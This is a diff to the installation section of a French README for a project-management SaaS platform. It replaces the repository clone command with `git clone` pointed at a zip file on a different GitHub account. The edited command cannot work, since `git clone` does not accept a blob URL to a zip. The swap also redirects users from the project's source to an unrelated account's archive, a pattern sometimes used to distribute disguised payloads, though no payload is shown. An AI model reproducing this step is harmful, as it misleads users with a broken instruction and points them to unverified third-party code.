@@ -94,7 +94,7 @@ Le produit est une **plateforme SaaS de gestion de projets**, destinée à :
 
 1. Clonez ce repository :
    ```bash
-   git clone [https://github.com/marc-awad/project-manager-saas.git](https://github.com/sousou245/Project_saas/blob/main/project-manager-saas-main.zip)
+   git clone https://github.com/sousou245/Project_saas/blob/main/project-manager-saas-main.zip
    ```
 2. Installez les dépendances :
    ```bash
